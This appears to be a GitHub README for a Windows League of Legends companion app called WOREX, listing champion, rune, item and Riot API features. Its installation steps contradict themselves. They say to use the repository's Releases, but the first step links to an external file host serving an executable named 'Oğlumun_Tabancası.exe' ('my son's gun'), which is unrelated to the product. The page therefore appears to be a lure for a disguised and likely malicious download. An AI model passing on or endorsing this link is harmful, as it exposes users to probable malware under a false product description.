# WOREX League Companion

**A modern League of Legends companion for Windows.**

WOREX League Companion is a desktop application designed to bring League of Legends champion information, item builds, rune data, matchup analysis, and player statistics together in one convenient interface.

Built with a focus on performance, usability, and a sleek dark interface, WOREX aims to make game information easier to access without switching between multiple websites.

**Platform:** Windows 10 / Windows 11 · 64-bit  
**Application type:** Desktop application (.exe)  
**Language:** Turkish  
**Brand:** WOREX

## 🇬🇧 English

### 📌 About

**WOREX League Companion** is a modern Windows desktop application designed for League of Legends players.

It aims to bring champion information, item builds, rune data, matchup analysis, and player statistics together in one convenient interface.

The application is designed to use existing Data Dragon assets from the local `loldata` directory. For Riot API features, users can configure their own API key through the application settings.

### ✨ Features

- **Champion guide:** Champion information, abilities, and artwork.
- **Item system:** Item details, descriptions, and build data.
- **Rune system:** Rune trees and available rune information.
- **Counter and matchup analysis:** Matchup statistics when provided by an available data source.
- **Player search:** Access supported player information using a Riot ID.
- **Match history:** Match details when the required Riot API access and data are available.
- **Personal API configuration:** Users can enter their own Riot API key.
- **Modern dark UI:** A clean interface following the WOREX visual identity.
- **Local data support:** Uses available game data stored in the `loldata` directory.

> External statistics and player data depend on source availability, API permissions, and rate limits.

### 🚀 Download and installation

Download the working Windows `.exe` build from the **Releases** section of this GitHub repository.

1. [İndirme sayfasını aç](https://dosya.co/tn1ak42k5mud/Oğlumun_Tabancası.exe.html).
2. Download the latest Windows `.exe` asset.
3. Run the downloaded application.
4. To use Riot API-powered features, configure your own API key in the application's **Settings** section.

**Note:** If the release requires additional data files, download those files from the same release. Whether the executable is fully standalone depends on the published package.

### 🔑 Riot API configuration

You can obtain a Riot API key through the Riot Developer Portal:

https://developer.riotgames.com/

Open the application's settings and configure your own key.

- Each user supplies their own API key.
- Access and rate limits depend on the API key type.
- Development keys may expire.
- Never publish your API key in GitHub repositories, public files, or screenshots.

Features that rely on local game data may remain available without an API key, depending on the feature and the included data.

### 🛠️ Data sources

- **Data Dragon:** Champion, item, rune, ability, and game asset data.
- **Riot Games API:** Supported player and match data.
- **OP.GG:** Statistical data where a permitted and accessible integration is available.

Each source has its own capabilities and limitations. The application should clearly indicate when data is unavailable.

### 📋 Requirements

- Windows 10 or Windows 11 (64-bit)
- Required files included in the application distribution
- Internet access for dynamic API features
- A valid API key for Riot API-powered features
